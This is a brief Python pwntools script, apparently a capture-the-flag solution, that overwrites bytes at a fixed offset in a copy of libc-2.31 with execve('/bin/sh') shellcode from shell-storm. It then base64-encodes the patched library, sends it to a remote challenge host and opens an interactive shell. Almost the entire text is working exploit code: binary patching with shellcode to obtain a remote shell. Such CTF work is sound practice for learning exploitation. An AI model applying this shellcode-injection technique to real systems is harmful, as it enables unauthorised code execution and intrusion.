from pwn import * 
import os 
from pwn import *
import base64
context.arch = 'amd64'

place = 0xE2DC4
# ref https://shell-storm.org/shellcode/files/shellcode-806.html
code = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"


os.system('rm ./libc-2.31.so ; cp  ./libc ./libc-2.31.so')
f = open('./libc-2.31.so','rb+')
a = f.read()

b = a[place:place+len(code)]
a = a.replace(b,code)
bytes_encode = base64.b64encode(a)

r = remote('edu-ctf.zoolab.org',10002)

r.send(bytes_encode)
r.interactive()